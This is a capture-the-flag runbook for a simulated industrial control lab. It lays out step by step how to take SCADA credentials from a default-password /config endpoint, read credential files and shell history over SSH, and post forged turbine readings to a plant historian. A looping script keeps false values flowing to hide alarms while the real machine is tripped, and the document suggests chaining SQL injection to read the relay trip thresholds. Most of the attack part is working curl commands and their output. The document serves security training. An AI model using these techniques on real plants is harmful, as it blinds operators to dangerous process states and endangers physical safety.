# Runbook: historian ingest poisoning via SCADA credential chain

Inject false process readings into the historian using credentials harvested from the
SCADA server. The SCADA dashboard then shows attacker-controlled values as live plant
data. Real alarm conditions can be suppressed; false alarms can be generated at will.

- Techniques: 
  - [Data exfiltration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#data-exfiltration)
  - [Data integrity manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#data-integrity-manipulation)
- Challenge type: Realist
- Difficulty: Intermediate

## Components to start

```bash
./ctl up
```

Minimal containers: `uupl-historian`, `distribution-scada`, `scada-db`

`scada-db` is the MySQL sidecar that `distribution-scada` requires at startup. The SCADA
dashboard is the observable consequence of the injection; without it, the ingest still
works but nothing displays the falsified values. 

Entry point: any host with operational zone access. `bursar-desk` (10.10.2.100) and the 
engineering workstation (10.10.2.30) both have direct routes to the historian and SCADA.

## Background

The historian `/ingest` endpoint accepts authenticated POST requests and writes directly
to the `readings` table with no validation of asset names or values. The credentials for
this endpoint (`hist_read:history2017`) are documented in the SCADA server's `/config`
endpoint, which is protected only by `admin:admin`.

The SCADA dashboard polls the historian for live plant data. Injecting false readings
causes the dashboard to display whatever an attacker chooses. The relay IEDs hold their
own threshold registers and continue acting on real Modbus data; only the displayed
values are affected.

## Attack path

### Stage 1: SCADA server, credential harvest

```bash
# SCADA server at 10.10.2.20
# Note the version header before attempting auth
curl -I http://10.10.2.20:8080/
# X-Powered-By: UU-SCADA/2.1 Flask/2.3 Python/3.11
# WWW-Authenticate: Basic realm="UU P&L SCADA"

# Default credentials have not changed since commissioning
curl -u admin:admin http://10.10.2.20:8080/config
# [historian]
# host     = 10.10.2.10
# user     = hist_read
# password = history2017
#
# [alarm_smtp]
# host     = mail.uu.am
# port     = 587
# user     = alarms@uupl.am
# password = plantmail123
#
# [scada]
# web_user = admin
# web_pass = admin
```

### Stage 2: optional, interactive shell on the SCADA server

```bash
# SSH credentials are buried in the virtual filesystem
# The /config endpoint also returns scada_admin's SSH password
curl -u admin:admin http://10.10.2.20:8080/config
# [scada_admin]
# ssh_user = scada_admin
# ssh_pass = W1nd0ws@2016

ssh scada_admin@10.10.2.20
# Password: W1nd0ws@2016

# Full credential picture from the virtual filesystem
type C:\SCADA\Config\scada.ini

# Alarm log reveals trip threshold values: useful for calibrating injected readings
type C:\SCADA\Logs\alarm_log_2026.txt

# PSReadLine history shows prior historian queries including auth headers
type C:\Users\scada_admin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Stage 3: inject false readings

```bash
# Confirm the historian is alive and list asset names
curl http://10.10.2.10:8080/assets
# ["turbine_main","relay_a","relay_b","meter"]

# Check current real readings for reference
curl "http://10.10.2.10:8080/report?asset=turbine_main&from=2026-04-14T00:00:00&to=2026-04-14T23:59:59"

# Inject a false RPM reading: dashboard shows turbine at rest while it runs
curl -u hist_read:history2017 \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"timestamp":"2026-04-14T09:00:00","asset":"turbine_main","value":0,"unit":"RPM"}' \
     http://10.10.2.10:8080/ingest
# {"status":"ok"}

# Inject a reading above the overspeed threshold (3300 RPM) to trigger a false alarm
curl -u hist_read:history2017 \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"timestamp":"2026-04-14T09:00:01","asset":"turbine_main","value":3500,"unit":"RPM"}' \
     http://10.10.2.10:8080/ingest
# SCADA dashboard shows 3500 RPM: alarm pipeline fires to ops-duty@uupl.am
```

### Stage 4: sustained suppression

```bash
# Inject normal-looking values continuously while the real plant is in a degraded state
# The SCADA dashboard polls the historian every few seconds
# Injecting at higher frequency makes the false values dominate

for i in $(seq 1 60); do
    curl -s -u hist_read:history2017 \
         -X POST \
         -H "Content-Type: application/json" \
         -d "{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S)\",\"asset\":\"turbine_main\",\"value\":2999,\"unit\":\"RPM\"}" \
         http://10.10.2.10:8080/ingest
    sleep 5
done

# If the real turbine has been tripped via Modbus in parallel, operators see
# normal readings on the dashboard while the machine is offline
```

## Flag placement

Place the flag as a reading for a distinctive asset:

```bash
curl -u hist_read:history2017 \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"timestamp":"2026-04-14T00:00:00","asset":"ctf_flag","value":1,"unit":"RM{...}"}' \
     http://10.10.2.10:8080/ingest
```

The participant recovers it by:
1. Recovering `hist_read:history2017` from the SCADA `/config` endpoint
2. Querying `/assets` and noticing `ctf_flag`
3. Querying `/report?asset=ctf_flag&from=2026-04-14T00:00:00&to=2026-04-14T23:59:59`

## Why this matters in real deployments

Historian web interfaces frequently have no authentication on read endpoints by design:
if you are on the network, you are authorised. The `/ingest` endpoint here has weak
authentication with credentials documented in two other places on the network. The
combination of unauthenticated reads and weakly authenticated writes is the realistic
pattern this chain demonstrates.

The real-world consequence is not only a false dashboard: alarm suppression means
operators do not know the physical process is in a degraded state. Injecting normal
readings while the turbine is tripped gives a window to work in the control zone before
anyone notices anything is wrong.

## Chaining further

Combine with the historian SQLi chain: use SQL injection on `/report` to read the
`alarm_config` table (exact relay trip thresholds), then use `/ingest` to inject readings
that sit just below those thresholds. The relay protection never fires based on displayed
data, but the real plant state can be whatever was arranged on the Modbus side.